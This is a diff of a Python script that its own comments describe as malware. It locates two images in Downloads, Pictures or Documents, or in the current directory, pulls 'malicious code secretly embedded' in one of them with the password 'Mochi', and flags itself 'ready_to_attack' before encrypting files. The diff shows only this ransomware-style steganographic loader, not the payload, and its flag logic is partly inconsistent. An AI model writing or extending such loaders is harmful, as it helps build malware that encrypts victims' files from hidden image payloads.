@@ -6,7 +6,7 @@ def main():
     # Represents the name of the two images to be scanned for in the downloads directory
     # TODO: Update this to the name of the appropriate images
     image_containing_key: str = "download.jpg"
-    image_containing_encryption_code: str = "download.bpm"
+    image_containing_encryption_code: str = "download2.bpm"
 
     # Represents whether the two images were found or not
     key_found: bool = False
@@ -15,20 +15,18 @@ def main():
     # Scans the Downloads folder to look for the images and applications needed
     # for the malware to remain operational
     whitelist: list[str] = [image_containing_key, image_containing_encryption_code]
-    downloads_directory: str = os.path.expanduser("~/Downloads")
+    ready_to_attack: bool = key_found and code_found
 
-    # Iterates through each file within the downloads folder to find the image with the key and malicious code
-    for _, _, files in os.walk(downloads_directory):
-        for file in files:
-            if file in whitelist:
-                if file == image_containing_key:
-                    key_found = True
-                if file == image_containing_encryption_code:
-                    code_found = True
-            print(file)
+    # Searches through current directory to find the embedded files
+    if os.path.exists(image_containing_key) and os.path.exists(image_containing_encryption_code):
+        ready_to_attack = True
+    else:
+        raise FileNotFoundError(f"Check if the image name/path '{image_containing_key}' or "
+                                f"'{image_containing_encryption_code}' exists in the current directory. "
+                                f"It could also be that the name fed to the variable in the code needs to be updated "
+                                f"or the image specified just doesn't exist.")
 
     # Determines whether both the key and code were found
-    ready_to_attack: bool = key_found and code_found
 
     # Retrieves malicious code secretly embedded in one of the images
     code_to_encrypt_files: str = extract_message(image_containing_encryption_code, "Mochi")
@@ -37,7 +35,7 @@ def main():
     while not ready_to_attack:
         # Checks to see if the images are in Downloads or if user moved them to
         # another directory
-        directories_to_be_searched = [downloads_directory,
+        directories_to_be_searched = [os.path.expanduser("~/Downloads"),
                                       os.path.expanduser("~/Pictures"),
                                       os.path.expanduser("~/Documents")]
 
